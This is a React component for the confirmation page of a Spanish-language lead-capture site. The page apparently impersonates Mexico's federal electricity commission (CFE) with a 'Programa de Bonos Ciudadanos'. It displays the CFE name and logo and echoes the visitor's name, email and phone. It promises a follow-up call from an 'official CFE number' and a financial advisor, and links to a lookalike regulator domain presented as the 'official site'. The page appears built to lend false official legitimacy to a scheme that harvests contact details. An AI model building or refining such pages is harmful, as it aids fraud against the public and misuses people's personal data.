import React, { useEffect } from 'react';
import { PhoneIcon, CheckCircleIcon, ArrowLeftIcon } from 'lucide-react';
import { trackLeadEvent } from '../services/api';
interface SuccessPageProps {
  leadData: {
    name: string;
    email: string;
    phone: string;
  };
  leadId?: string;
}
export function SuccessPage({
  leadData,
  leadId
}: SuccessPageProps) {
  // Track page view when the success page loads
  useEffect(() => {
    trackLeadEvent('success_page_view', {
      lead_id: leadId || 'unknown'
    });
  }, [leadId]);
  // Track external link click
  const handleExternalLinkClick = () => {
    trackLeadEvent('external_link_click', {
      lead_id: leadId || 'unknown',
      destination: 'official_site'
    });
  };
  return <main className="w-full max-w-4xl mx-auto px-4 py-8 md:py-12">
      {/* Success banner */}
      <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8 flex items-center">
        <CheckCircleIcon size={24} className="text-green-600 mr-3 flex-shrink-0" />
        <div>
          <h2 className="font-bold text-green-800">
            Solicitud procesada correctamente
          </h2>
          <p className="text-green-700 text-sm">
            Su información ha sido recibida y será procesada por nuestro equipo
          </p>
        </div>
      </div>
      <div className="grid md:grid-cols-2 gap-8">
        <div>
          <div className="border border-gray-200 rounded-lg shadow-sm p-6 mb-6">
            {/* Main heading */}
            <div className="flex items-center mb-6">
              <div className="w-14 h-14 rounded-full border-2 border-red-500 flex items-center justify-center mr-4">
                <PhoneIcon size={24} className="text-red-500" />
              </div>
              <h1 className="text-2xl font-bold">¡Registro exitoso!</h1>
            </div>
            {/* Confirmation text */}
            <p className="mb-6">
              Su solicitud para el{' '}
              <span className="font-semibold">
                Programa de Bonos Ciudadanos CFE
              </span>{' '}
              ha sido recibida. Un asesor financiero se pondrá en contacto con
              usted en las próximas{' '}
              <span className="text-red-600 font-semibold">24 horas</span>.
            </p>
            {/* CFE logo and verification */}
            <div className="flex items-center mb-6 border-t border-gray-100 pt-4">
              <img src="/gratis-png-comision-federal-de-electricidad-de-la-ciudad-de-mexico-con-el-logotipo-de-pemex-mil-removebg-preview.png" alt="CFE" className="h-12" />
              <div className="ml-4">
                <div className="font-medium">
                  Comisión Federal de Electricidad
                </div>
                <div className="text-xs text-gray-500">
                  Programa Oficial de Bonos Ciudadanos
                </div>
              </div>
            </div>
            {/* Email confirmation note */}
            <div className="bg-gray-50 p-4 rounded-md text-sm mb-6">
              <p className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-2 text-gray-600">
                  <rect x="2" y="4" width="20" height="16" rx="2"></rect>
                  <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
                </svg>
                Se ha enviado un correo de confirmación a su dirección
                registrada
              </p>
            </div>
            {/* External link button */}
            <a href="https://www.cnbvmexico.com.mx/optin" target="_blank" rel="noopener noreferrer" className="block w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded text-center mb-4 flex items-center justify-center" onClick={handleExternalLinkClick}>
              <ArrowLeftIcon size={16} className="mr-2" />
              CONTINUAR AL SITIO OFICIAL
            </a>
          </div>
        </div>
        <div>
          {/* Contact information */}
          <div className="border border-gray-200 rounded-lg shadow-sm p-6 mb-6">
            <div className="flex items-center mb-4">
              <CheckCircleIcon size={20} className="text-red-500 mr-2" />
              <h3 className="font-medium text-lg">
                Información de contacto verificada
              </h3>
            </div>
            <div className="space-y-4">
              <div className="bg-gray-50 p-3 rounded-md">
                <div className="text-sm text-gray-600">Nombre completo:</div>
                <div className="font-medium">{leadData.name}</div>
              </div>
              <div className="bg-gray-50 p-3 rounded-md">
                <div className="text-sm text-gray-600">Correo electrónico:</div>
                <div className="font-medium">{leadData.email}</div>
              </div>
              <div className="bg-gray-50 p-3 rounded-md">
                <div className="text-sm text-gray-600">
                  Teléfono de contacto:
                </div>
                <div className="font-medium">{leadData.phone}</div>
              </div>
            </div>
          </div>
          {/* Next steps */}
          <div className="border border-gray-200 rounded-lg shadow-sm p-6">
            <h3 className="font-medium text-lg mb-4 border-l-3 border-red-500 pl-3">
              Próximos pasos:
            </h3>
            <div className="space-y-4">
              <div className="flex items-start bg-gray-50 p-3 rounded-md">
                <PhoneIcon size={16} className="text-red-500 mr-3 mt-1" />
                <div>
                  <p className="font-medium">Llamada de confirmación</p>
                  <p className="text-sm text-gray-600">
                    Recibirá una llamada de un número oficial de CFE
                  </p>
                </div>
              </div>
              <div className="flex items-start bg-gray-50 p-3 rounded-md">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-red-500 mr-3 mt-1">
                  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                  <line x1="16" y1="2" x2="16" y2="6"></line>
                  <line x1="8" y1="2" x2="8" y2="6"></line>
                  <line x1="3" y1="10" x2="21" y2="10"></line>
                  <path d="m9 16 2 2 4-4"></path>
                </svg>
                <div>
                  <p className="font-medium">Asesoría personalizada</p>
                  <p className="text-sm text-gray-600">
                    Su asesor le explicará los detalles del programa y resolverá
                    sus dudas
                  </p>
                </div>
              </div>
              <div className="flex items-start bg-gray-50 p-3 rounded-md">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-red-500 mr-3 mt-1">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                </svg>
                <div>
                  <p className="font-medium">Seguridad garantizada</p>
                  <p className="text-sm text-gray-600">
                    Todos los procesos cumplen con los más altos estándares de
                    seguridad
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>;
}